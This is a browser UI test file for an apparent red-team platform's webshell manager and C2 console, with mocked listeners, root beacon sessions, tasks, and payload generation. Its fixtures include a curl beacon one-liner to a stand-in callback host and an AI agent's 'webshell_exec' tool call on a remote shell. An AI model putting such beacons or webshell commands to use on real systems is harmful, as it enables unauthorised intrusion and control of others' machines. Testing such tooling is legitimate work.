import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { chromium, type Browser, type Page } from '@playwright/test';
import { build } from 'vite';
import { readFile } from 'node:fs/promises';
import { fileURLToPath } from 'node:url';

// A separate in-memory bundle and intercepted origin: no app build, dev server, or shared port.
let browser: Browser;
let source = '';
let shell = '';
const root = fileURLToPath(new URL('../../../', import.meta.url));
beforeAll(async () => {
  shell = (await readFile(new URL('../../../index.html', import.meta.url), 'utf8')).replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '');
  const result = await build({
    root, configFile: false, logLevel: 'silent',
    plugins: [{ name: 'access-standalone-fixture', resolveId(id) { if (id === 'access-fixture') return '\0access-fixture'; }, load(id) {
      if (id !== '\0access-fixture') return;
      return `import { initWebshell } from '/src/features/webshell/index.ts';
        import { initC2 } from '/src/features/c2/index.ts';
        import { createAccessBrowser } from '/src/platform/access-browser.ts';
        const browser = createAccessBrowser(document);
        const common = { browser, request: (path, init) => fetch(path, init), can: () => true,
          projectNames: () => ({ p1: 'Project One' }), ensureProjects: async () => [],
          notify: (message, type) => { const item = document.createElement('div'); item.className = 'test-notification'; item.dataset.type = type; item.textContent = message; document.body.append(item); } };
        let webshell, c2;
        function mount() {
          webshell = initWebshell({ ...common, t: (key, fallback) => fallback || key, markdown: text => text,
            role: () => '', setRole() {}, newProject() {} });
          c2 = initC2({ ...common, t: key => key, currentPage: () => 'webshell' });
          webshell.activate(); webshell.activate(); c2.activate(); c2.activate();
          void webshell.controller.initWebshellPage();
        }
        mount();
        const dispose = document.createElement('button'); dispose.id = 'test-dispose'; dispose.textContent = 'Dispose'; dispose.addEventListener('click', async () => { c2.dispose(); await webshell.dispose(); dispose.dataset.done = 'true'; }); document.body.append(dispose);
        const remount = document.createElement('button'); remount.id = 'test-remount'; remount.textContent = 'Remount'; remount.addEventListener('click', mount); document.body.append(remount);
        const ready = document.createElement('div'); ready.id = 'test-ready'; document.body.append(ready);`;
    } }],
    build: { write: false, minify: false, sourcemap: false, rolldownOptions: { input: 'access-fixture', output: { codeSplitting: false } } },
  });
  const outputs = Array.isArray(result) ? result : [result];
  for (const output of outputs) if ('output' in output) for (const chunk of output.output) if (chunk.type === 'chunk' && chunk.isEntry) source = chunk.code;
  if (!source) throw new Error('Standalone access fixture did not produce an entry');
  browser = await chromium.launch({ headless: true });
}, 60000);
afterAll(async () => { await browser?.close(); });

interface Call { path: string; method: string; body: Record<string, unknown> | undefined; }
async function open(transform?: (path: string, method: string, data: unknown) => unknown): Promise<{ page: Page; calls: Call[]; errors: string[] }> {
  const page = await browser.newPage(); const calls: Call[] = []; const errors: string[] = [];
  page.setDefaultTimeout(8000);
  page.on('pageerror', error => errors.push(error.message));
  await page.route('http://access.test/**', async route => {
    const request = route.request(); const url = new URL(request.url());
    if (url.pathname === '/') { await route.fulfill({ contentType: 'text/html', body: `<html><head><style>.webshell-pane:not(.active){display:none}.modal{display:none}#webshell-terminal-container{width:800px;height:350px}.page{display:block}.c2-tasks-table,.c2-events-table{border-spacing:0}</style></head><body>${shell}<script type="module" src="/fixture.js"></script></body></html>` }); return; }
    if (url.pathname === '/fixture.js') { await route.fulfill({ contentType: 'text/javascript', body: source }); return; }
    if (!url.pathname.startsWith('/api/')) { await route.fulfill({ status: 204 }); return; }
    let body: Record<string, unknown> | undefined;
    try { body = request.postDataJSON() as Record<string, unknown> | undefined; } catch { /* No body. */ }
    calls.push({ path: url.pathname, method: request.method(), body });
    const connection = { id: 'ws_1', url: 'https://example.test/shell.php', password: '********', type: 'php', method: 'post', cmdParam: 'cmd', encoding: 'auto', os: 'linux', remark: 'Test shell', createdAt: '' };
    let data: unknown = {};
    if (url.pathname === '/api/webshell/connections') data = request.method() === 'GET' ? [connection] : { id: 'ws_new' };
    else if (url.pathname.endsWith('/state')) data = { state: {} };
    else if (url.pathname.endsWith('/ai-history')) data = { messages: [] };
    else if (url.pathname.endsWith('/ai-conversations')) data = [];
    else if (url.pathname === '/api/roles') data = { roles: [] };
    else if (url.pathname === '/api/config') data = { multi_agent: { enabled: false } };
    else if (url.pathname === '/api/webshell/file') data = { ok: true, output: body?.action === 'list' ? '-rw-r--r-- 1 root root 5 Oct 29 12:00 test file.txt\ndrwxr-xr-x 2 root root 4096 Oct 29 12:00 folder' : 'hello' };
    else if (url.pathname === '/api/webshell/exec') data = { ok: true, output: String(body?.command || '').replace(/^echo /, '') };
    else if (url.pathname === '/api/c2/listeners') data = { listeners: [{ id: 'l_1', name: 'Listener One', type: 'http_beacon', bindHost: '127.0.0.1', bindPort: 8080, profileId: '', configJson: '{}', status: 'stopped', remark: '', createdAt: '' }] };
    else if (url.pathname === '/api/c2/profiles') data = { profiles: [] };
    else if (url.pathname === '/api/c2/tasks') data = request.method() === 'POST' ? { task_id: 't_1' } : { tasks: [{ id: 't_1', sessionId: 's_1', taskType: 'shell', payload: { command: 'whoami' }, status: 'queued', resultText: '', source: 'manual', createdAt: '' }], total: 1 };
    else if (url.pathname === '/api/c2/tasks/t_1') data = { task: { id: 't_1', sessionId: 's_1', taskType: 'shell', status: 'success', resultText: '-\t-rw-r--r--\t5\tfile.txt', createdAt: '' } };
    else if (url.pathname === '/api/c2/sessions') data = { sessions: [{ id: 's_1', listenerId: 'l_1', implantUuid: 'beacon', hostname: 'Host One', username: 'root', os: 'linux', arch: 'amd64', pid: 1, processName: 'beacon', isAdmin: true, internalIp: '10.0.0.1', externalIp: '', userAgent: '', sleepSeconds: 5, jitterPercent: 0, status: 'active', firstSeenAt: '', lastCheckIn: '', note: '', metadata: { transport: 'http_beacon' } }] };
    else if (url.pathname === '/api/c2/events/stream') { await route.fulfill({ contentType: 'text/event-stream', body: ': connected\n\n' }); return; }
    else if (url.pathname === '/api/c2/events') data = { events: [{ id: 'e_1', level: 'info', category: 'task', sessionId: 's_1', message: 'Task completed', data: { task_id: 't_1' }, createdAt: '' }], total: 1 };
    else if (url.pathname === '/api/c2/payloads/oneliner') data = { oneliner: 'curl https://callback.test/beacon' };
    else if (url.pathname === '/api/c2/payloads/build') data = { payload: { os: 'linux', arch: 'amd64', size_bytes: 1234, download_path: '/api/c2/payloads/beacon/download' } };
    else if (url.pathname === '/api/eino-agent/stream') { await route.fulfill({ contentType: 'text/event-stream', body: 'data: {"type":"conversation","data":{"conversationId":"conv_1"}}\n\ndata: {"type":"tool_call","data":{"toolName":"webshell_exec","argumentsObj":{"command":"id"}}}\n\ndata: {"type":"response","message":"Verified answer","data":{"finalized":true}}\n\ndata: {"type":"done"}\n\n' }); return; }
    await route.fulfill({ json: transform ? transform(url.pathname, request.method(), data) : data });
  });
  await page.goto('http://access.test/');
  try { await page.locator('#test-ready').waitFor({ state: 'attached' }); await page.locator('.webshell-item').waitFor(); }
  catch (error) { await page.close(); throw new Error(`Access fixture failed: ${errors.join('; ')}; ${String(error)}`); }
  return { page, calls, errors };
}
describe('standalone access browser public behaviors', () => {
  it('recovers from list and file errors and tolerates sparse task records', async () => {
    let failTasks = true; let failFiles = true;
    const { page, errors } = await open((path, method, data) => {
      if (path === '/api/c2/tasks' && method === 'GET') return failTasks ? { error: 'Task history unavailable' } : { tasks: [{ id: 't_sparse', sessionId: 's_1', status: 'queued', createdAt: '' }], total: 1 };
      if (path === '/api/c2/tasks/t_1' && failFiles) return { task: { id: 't_1', status: 'success', resultText: 'ls: cannot access /private: Permission denied' } };
      return data;
    });
    try {
      await page.evaluate(() => dispatchEvent(new CustomEvent('pageChanged', { detail: { pageId: 'c2-activity' } })));
      await page.locator('#c2-tasks-load-state').filter({ hasText: 'Task history unavailable' }).waitFor();
      failTasks = false; await page.locator('#c2-tasks-load-state [data-action="c2.tasks-refresh"]').click();
      await page.locator('[data-task-id="t_sparse"]').waitFor();
      expect(await page.locator('#c2-tasks-stat-success').textContent()).toBe('—');
      await page.evaluate(() => dispatchEvent(new CustomEvent('pageChanged', { detail: { pageId: 'c2-sessions' } })));
      await page.locator('.c2-session-tab[data-tab="files"]').click();
      await page.locator('#c2-file-list .c2-error').filter({ hasText: 'Permission denied' }).waitFor();
      expect(await page.locator('#c2-file-list table').count()).toBe(0);
      failFiles = false; await page.locator('#c2-file-list [data-action="c2.file-path"]').click();
      await page.locator('#c2-file-list table').waitFor();
      expect(errors).toEqual([]);
    } finally { await page.close(); }
  }, 30000);
  it('binds shell controls once and removes listeners across disposal and remount', async () => {
    const { page, calls, errors } = await open();
    try {
      expect(await page.locator('#page-webshell [onclick],#webshell-modal [onclick]').count()).toBe(0);
      expect(await page.locator('[id^="page-c2-"] [onclick],#c2-modal[onclick],#c2-modal [onclick]').count()).toBe(0);
      await page.locator('#page-webshell [data-action="webshell.add"]').click(); await page.locator('#webshell-url').fill('https://example.test/new.php'); await page.locator('#webshell-password').fill('secret');
      await page.locator('#webshell-modal [data-action="webshell.save"]').click();
      await page.waitForFunction(() => document.querySelector<HTMLElement>('#webshell-modal')?.style.display === 'none');
      expect(calls.find(call => call.path === '/api/webshell/connections' && call.method === 'POST')?.body).toMatchObject({ url: 'https://example.test/new.php', password: 'secret', cmd_param: '' });
      await page.locator('#test-dispose').click(); await page.locator('#test-dispose[data-done="true"]').waitFor();
      const before = calls.filter(call => call.path === '/api/webshell/connections' && call.method === 'POST').length;
      await page.locator('#page-webshell [data-action="webshell.add"]').click();
      expect(await page.locator('#webshell-modal').evaluate(node => (node as HTMLElement).style.display)).toBe('none');
      await page.locator('#test-remount').click();
      await page.locator('#page-webshell [data-action="webshell.add"]').click();
      await page.locator('#webshell-url').fill('https://example.test/remount.php'); await page.locator('#webshell-password').fill('secret');
      await page.locator('#webshell-modal [data-action="webshell.save"]').click();
      await page.waitForFunction(() => document.querySelector<HTMLElement>('#webshell-modal')?.style.display === 'none');
      expect(calls.filter(call => call.path === '/api/webshell/connections' && call.method === 'POST')).toHaveLength(before + 1);
      expect(errors).toEqual([]);
    } finally { await page.close(); }
  }, 30000);
  it('selects connections, browses/edits files, streams AI, and preserves memo state through the public UI', async () => {
    const { page, calls, errors } = await open();
    try {
      await page.locator('.webshell-item').click(); await page.locator('#webshell-terminal-container .xterm').waitFor();
      await page.locator('.webshell-tab[data-tab="file"]').click();
      const fileRow = page.locator('.webshell-file-row').filter({ hasText: 'test file.txt' });
      await fileRow.locator('summary').click(); await fileRow.locator('[data-action="webshell.file-edit"]').click();
      await page.locator('#webshell-edit-content').fill('updated'); await page.locator('#webshell-edit-save').click();
      await page.locator('.webshell-tab[data-tab="memo"]').click(); await page.locator('#webshell-ai-memo-input').fill('persistent memo');
      await page.locator('.webshell-tab[data-tab="ai"]').click(); await page.locator('#ws-project-btn').click(); await page.locator('#ws-project-list [data-id="p1"]').click(); await page.locator('#webshell-ai-input').fill('inspect access'); await page.locator('#webshell-ai-send').click();
      await page.getByText('Verified answer', { exact: true }).waitFor();
      expect(await page.locator('.webshell-ai-msg.webshell-ai-finalized-output[data-finalized="true"]').count()).toBe(1);
      expect(calls.some(call => call.path === '/api/webshell/file' && call.body?.action === 'write' && call.body.content === 'updated')).toBe(true);
      expect(calls.find(call => call.path === '/api/eino-agent/stream')?.body).toMatchObject({ projectId: 'p1', webshellConnectionId: 'ws_1' });
      expect(await page.locator('.webshell-ai-process-block').count()).toBeGreaterThan(0);
      await page.locator('#test-dispose').click(); await page.locator('#test-dispose[data-done="true"]').waitFor();
      expect(calls.some(call => call.path.endsWith('/state') && call.method === 'PUT' && JSON.stringify(call.body).includes('persistent memo'))).toBe(true); expect(errors).toEqual([]);
    } finally { await page.close(); }
  }, 30000);
  it('opens C2 listeners and sessions through page events and dispatches explicit typed form mutations', async () => {
    const { page, calls, errors } = await open();
    try {
      await page.evaluate(() => dispatchEvent(new CustomEvent('pageChanged', { detail: { pageId: 'c2-listeners' } })));
      await page.locator('[data-listener-id="l_1"]').waitFor(); await page.locator('[data-action="c2.listener-start"]').click();
      await page.locator('#page-c2-listeners [data-action="c2.listener-create-modal"]').click(); await page.locator('#c2-listener-name').fill('New listener'); await page.locator('#c2-listener-port').fill('9000'); await page.locator('#c2-modal [data-action="c2.listener-save"]').click();
      await page.evaluate(() => dispatchEvent(new CustomEvent('pageChanged', { detail: { pageId: 'c2-sessions' } })));
      await page.locator('.c2-session-hero__title').waitFor(); await page.locator('.c2-session-tab[data-tab="info"]').click(); await page.locator('[data-action="c2.session-note-edit"]').click(); await page.locator('#c2-session-note-input').fill('operator note'); await page.locator('#c2-session-note-save').click();
      expect(calls.some(call => call.path === '/api/c2/listeners/l_1/start')).toBe(true);
      expect(calls.find(call => call.path === '/api/c2/listeners' && call.method === 'POST')?.body).toMatchObject({ name: 'New listener', bind_port: 9000 });
      await page.waitForFunction(() => document.querySelector('#c2-session-note-view')?.textContent === 'operator note');
      expect(calls.find(call => call.path === '/api/c2/sessions/s_1/note')?.body).toEqual({ note: 'operator note' }); expect(errors).toEqual([]);
    } finally { await page.close(); }
  }, 30000);
  it('handles C2 task/event filters and detail views, profile forms, and payload kind/build requests', async () => {
    const { page, calls, errors } = await open();
    try {
      await page.evaluate(() => dispatchEvent(new CustomEvent('pageChanged', { detail: { pageId: 'c2-tasks' } })));
      await page.locator('#c2-task-list [data-action="c2.task-view"]').click(); await page.locator('.c2-task-detail-grid').waitFor(); await page.locator('#c2-modal [data-action="c2.modal-close"]').first().click();
      await page.locator('#c2-tasks-filter-session').fill('s_1'); await page.locator('#page-c2-tasks [data-action="c2.tasks-filter"]').click();
      await page.evaluate(() => dispatchEvent(new CustomEvent('pageChanged', { detail: { pageId: 'c2-events' } })));
      await page.locator('#c2-event-list [data-action="c2.event-view"]').click(); await page.locator('#c2-event-data-pre').waitFor(); await page.locator('#c2-modal [data-action="c2.modal-close"]').first().click();
      await page.evaluate(() => dispatchEvent(new CustomEvent('pageChanged', { detail: { pageId: 'c2-profiles' } })));
      await page.locator('#page-c2-profiles [data-action="c2.profile-create-modal"]').click(); await page.locator('#c2-profile-name').fill('Browser profile'); await page.locator('#c2-profile-ua').fill('Mozilla test'); await page.locator('#c2-profile-headers').fill('{"Server":"nginx"}'); await page.locator('#c2-modal [data-action="c2.profile-save"]').click();
      await page.waitForFunction(() => document.querySelector<HTMLElement>('#c2-modal')?.style.display === 'none');
      await page.evaluate(() => dispatchEvent(new CustomEvent('pageChanged', { detail: { pageId: 'c2-payloads' } })));
      await page.locator('#c2-payload-listener').selectOption('l_1');
      expect(await page.locator('#c2-payload-kind').inputValue()).toBe('curl_beacon');
      await page.locator('#c2-generate-oneliner-btn').click(); await page.locator('#c2-oneliner-output').filter({ hasText: 'curl https://callback.test/beacon' }).waitFor();
      await page.locator('#c2-build-listener').selectOption('l_1'); await page.locator('#c2-build-btn').click(); await page.locator('#c2-build-result [data-action="c2.payload-download"]').waitFor();
      expect(calls.find(call => call.path === '/api/c2/profiles' && call.method === 'POST')?.body).toMatchObject({ name: 'Browser profile', userAgent: 'Mozilla test', responseHeaders: { Server: 'nginx' } });
      expect(calls.find(call => call.path === '/api/c2/payloads/oneliner')?.body).toMatchObject({ listener_id: 'l_1', kind: 'curl_beacon' });
      expect(calls.some(call => call.path === '/api/c2/payloads/build')).toBe(true); expect(errors).toEqual([]);
    } finally { await page.close(); }
  }, 30000);
});
